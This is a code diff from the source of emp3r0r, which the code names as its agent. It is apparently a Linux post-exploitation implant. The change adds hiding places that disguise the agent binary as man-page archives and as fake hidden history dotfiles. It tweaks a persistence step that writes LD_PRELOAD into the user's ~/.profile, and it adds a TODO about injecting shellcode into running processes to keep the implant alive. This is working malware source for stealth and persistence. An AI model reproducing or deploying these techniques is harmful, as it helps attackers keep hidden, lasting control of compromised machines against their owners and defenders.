@@ -25,7 +25,30 @@ var (
 	}
 
 	// EmpLocations all possible locations
-	EmpLocations = []string{"/tmp/.env", "/dev/shm/.env", "/env", fmt.Sprintf("%s/.env", os.Getenv("HOME")), "/usr/bin/.env", "/usr/local/bin/env", "/bin/.env"}
+	EmpLocations = []string{
+		// root
+		"/env",
+		"/usr/bin/.env",
+		"/usr/local/bin/env",
+		"/bin/.env",
+		"/usr/share/man/man1/arch.gz",
+		"/usr/share/man/man1/ls.1.gz",
+		"/usr/share/man/man1/arch.5.gz",
+
+		// no root required
+		"/tmp/.env",
+		"/dev/shm/.env",
+		fmt.Sprintf("%s/.wget-hst",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.less-hist",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.sudo_as_admin_successful",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.env",
+			os.Getenv("HOME")),
+		fmt.Sprintf("%s/.pam",
+			os.Getenv("HOME")),
+	}
 
 	// call this to start emp3r0r
 	payload = strings.Join(EmpLocations, " -silent=true -daemon=true || ") + " -silent=true -daemon=true"
@@ -157,8 +180,7 @@ func ldPreload() error {
 		log.Print(err)
 		return err
 	}
-	return AppendToFile(u.HomeDir+"/.profile", "export LD_PRELOAD="+Libemp3r0rFile)
-
+	return AppendToFile(u.HomeDir+"/.profile", "\nexport LD_PRELOAD="+Libemp3r0rFile)
 }
 
 // AddCronJob add a cron job without terminal
@@ -169,8 +191,10 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
+// Inject shellcode into a running process, the shellcode will make sure emp3r0r is alive
+// TODO
 func injector() (err error) {
-	return
+	return nil
 }
 
 func service() (err error) {
